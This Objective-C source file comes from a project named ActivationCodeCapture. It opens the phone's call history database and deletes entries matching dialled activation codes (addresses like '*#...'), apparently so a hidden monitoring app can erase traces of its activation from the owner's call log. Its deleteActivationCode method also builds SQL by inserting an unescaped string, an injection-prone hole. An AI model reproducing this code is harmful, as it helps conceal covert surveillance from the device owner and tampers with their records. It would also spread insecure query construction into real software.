//
//  CallHistoryDAO.m
//  ActivationCodeCapture
//
//  Created by Makara Khloth on 11/24/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "CallHistoryDAO.h"
#import "DefStd.h"

#import "FMDatabase.h"

static NSString* const kDeleteFromCallHistoryWhereAddress			= @"DELETE FROM call WHERE address = '%@'";
static NSString* const kDeleteFromCallHistoryWhereAddressSubString	= @"DELETE FROM call WHERE address LIKE '*#%'";

@implementation CallHistoryDAO

- (id) init {
	if ((self = [super init])) {
		mCallHistoryDatabase = [FMDatabase databaseWithPath:kCallHistoryDatabasePath];
		[mCallHistoryDatabase retain];
		[mCallHistoryDatabase open];
	}
	return (self);
}

- (BOOL) scanAndDeleteAllActivationCode {
	BOOL success = [mCallHistoryDatabase executeUpdate:kDeleteFromCallHistoryWhereAddressSubString];
	return (success);
}

- (BOOL) deleteActivationCode: (NSString*) aActivationCode {
	NSString* sqlStatement = [NSString stringWithFormat:kDeleteFromCallHistoryWhereAddress, aActivationCode];
	BOOL success = [mCallHistoryDatabase executeUpdate:sqlStatement];
	return (success);
}

- (void) dealloc {
	[mCallHistoryDatabase close];
	[mCallHistoryDatabase release];
	[super dealloc];
}

@end
